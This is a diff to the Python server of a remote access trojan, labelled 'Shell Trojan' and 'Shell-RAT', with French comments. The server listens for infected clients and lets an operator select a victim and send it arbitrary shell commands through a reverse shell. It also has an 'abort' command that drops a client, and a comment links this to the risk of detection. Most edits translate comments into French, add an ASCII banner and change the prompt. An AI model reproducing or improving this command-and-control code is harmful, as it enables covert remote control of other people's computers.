@@ -1,6 +1,14 @@
-import socket, subprocess, re, os, tabulate, tqdm
+import socket 
+import subprocess
+import re
+import os
+import tabulate
+import tqdm
+#----------------------------------
 from datetime import datetime
 from threading import Thread
+from art import tprint 
+
 
 
 SERVER_HOST = "0.0.0.0" # Ecoute sur toutes les interfaces 
@@ -16,15 +24,22 @@ class Server:
         self.port = port
         # Initialisation du socket 
         self.server_socket = self.get_server_socket()
-
         # Dictionnaire pour mapper chaque client avec son socket 
         self.clients = {}
         # Dictionnaire pour mapper chaque client avec son working directory 
         self.clients_cwd = {}
         # Client selectionner par le server, le client son selectionne via leur indices 
         self.current_client = None
+        self.verbose = True
         
-    
+    def print_baniere(self):
+        print("\n"+"="*100+"\n"+"+"*100)
+        tprint(
+            text=" Shell Trojan",
+            font='rnd-small',
+        )
+        print("\n"+"#"*100+"\n"+"-"*100)
+
     def get_server_socket(self, custom_port=None):
         """
             Cette methode sera utiliser pour lier le socket server sur celui du client 
@@ -44,7 +59,7 @@ class Server:
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.listen()
         print("\n\n")
-        print(f" Server en ecoute sur : [{SERVER_HOST}:{port} ] ".center(80,'~'))
+        print(f" Server en ecoute sur : [{SERVER_HOST}:{port} ] ".center(80,'~')) # Information a afficher dans les log et non sur l'interface
         return s
     
     def accept_connection(self):
@@ -99,7 +114,7 @@ class Server:
         """ Interface de communicatiomn avec le client """
         while True:
             try : 
-                command = input("\n\t [.-Shell-RAT-.]  (*_*) > ").strip() # Invite de commande 
+                command = input("\n\t>> [.-Shell-RAT-.]+++[-_-]  #>> ").strip() # Invite de commande 
             except KeyboardInterrupt as e: 
                 print("\n\n")
                 conf = input("\n\t\t Confirmer la fermeture d'urgence ...( Y / N ) > ").lower().lstrip()
@@ -116,29 +131,30 @@ class Server:
 
             elif (match := re.search(r"use\s*(\w*)", command)):
                 try:
-                    # get the index passed to the command
+                    # Recuperer Index client passer en parametre 
                     client_index = int(match.group(1))
                 except ValueError:
-                    # there is no digit after the use command
-                    print("Please insert the index of the client, a number.")
+                    # si un parametre incorrect est passer en parametre 
+                    print(" Selectionner un index client valide! plus d'info taper <help> ou <aide> ")
                     continue
                 else:
                     try:
                         self.current_client = list(self.clients)[client_index]
                     except IndexError:
-                        print(f"Please insert a valid index, maximum is {len(self.clients)}.")
+                        print(f" Selectionner un index client compris dans la liste ! Taper <list> ou <showall> pour voir les clients actifs")
                         continue
                     else:
-                        # start the reverse shell as self.current_client is set
+                        # Debuter le Shell reverse sur le client selectionner 
                         self.start_reverse_shell()
             
-            elif command.lower() in ["exit", "quit"]:
+            elif command.lower() in ["exit", "quit","quitter"]:
+                # Ecrire dans les logs fermeture de l'interpreteur server ! 
                 break
             elif command == "":
-                # do nothing if command is empty (i.e a new line)
+                # Si aucaune commande n'est saisit, ne rien faire 
                 pass
             else:
-                print("\t\t >>  [info] : Commande invalide :( ! ", command)
+                print("\t\t >>  [info] : Commande invalide :( ! ", command) # >>>>>> Ecrire dans les logs 
 
         self.close_connections()
 
@@ -147,39 +163,44 @@ class Server:
             Method responsible for starting the server:
             Accepting client connections and starting the main interpreter
         """
+        self.print_baniere()
         self.start_interpreter()
         self.accept_connections()
         
     
     def start_reverse_shell(self):
-        # get the current working directory from the current client
+        # Recuperer le repertoire de travail du client 
         cwd = self.clients_cwd[self.current_client]
-        # get the socket too
+        # Recuperer le deuxieme socket 
         client_socket = self.clients[self.current_client]
+
+        # Debut du shell reverse sur le client a partir du repertoire de travail du client 
         while True:
-            # get the command from prompt
+            # Prompt permettant d'entrer les commandes et de les envoyer aux clients  
             command = input(f"{cwd} $> ")
             if not command.strip():
-                # empty command
+                # Commande vide 
                 continue
-            if (match := re.search(r"local\s*(.*)", command)):
+            if (match := re.search(r"local\s*(.*)", command)): # La commande local te permet d'executer des commandes sur le serveur et non sur le client 
                 local_command = match.group(1)
                 if (cd_match := re.search(r"cd\s*(.*)", local_command)):
-                    # if it's a 'cd' command, change directory instead of using subprocess.getoutput
-                    cd_path = cd_match.group(1)
+                    # Si la commande c'est <cd>,  changer de repertoire au lieu de recuperer la sortie du shell avec <subprocess.getouput>
+                    # La methode <subprocess.getoutput> te permet de recuperer le flux de sortie d'une commande executer depuis le shell 
+                    cd_path = cd_match.group(1) # Recupere le chemin du repertoire passer en parametre 
                     if cd_path:
-                        os.chdir(cd_path)
+                        os.chdir(cd_path) # On change de repertoire 
                 else:
-                    local_output = subprocess.getoutput(local_command)
+                    local_output = subprocess.getoutput(local_command) # Sinon exceter la commande en local et afficher la sortie 
                     print(local_output)
-                # if it's a local command (i.e starts with local), do not send it to the client
+                # Les commandes locals (start by local) ne sont pas envoyer au client mais son executer directement sur le serveur 
                 continue
-            # send the command to the client
-            client_socket.sendall(command.encode())
+
+            # Commande destiner au client 
+            client_socket.sendall(command.encode()) # Envoie de la commande au client 
             if command.lower() in ["exit", "quit"]:
-                # if the command is exit, just break out of the loop
+                # Casser la boucle pour quitter le Shell  du client sans fermer la session car le socket a ete rendu reutilisable 
                 break
-            elif command.lower() == "abort":# if the command is abort, remove the client from the dicts & exit
+            elif command.lower() == "abort":# " Abondonner " Pour effacer le client de la liste des clients actifs et quitter ! Risque de detection n
                 del self.clients[self.current_client]
                 del self.clients_cwd[self.current_client]
                 break
@@ -288,8 +309,8 @@ class Server:
         s.close()
 
 if __name__ == "__main__":
+    server = Server(SERVER_HOST, SERVER_PORT)
     try : 
-        server = Server(SERVER_HOST, SERVER_PORT)
         server.start()
     except Exception as e :
         server.close_connections()
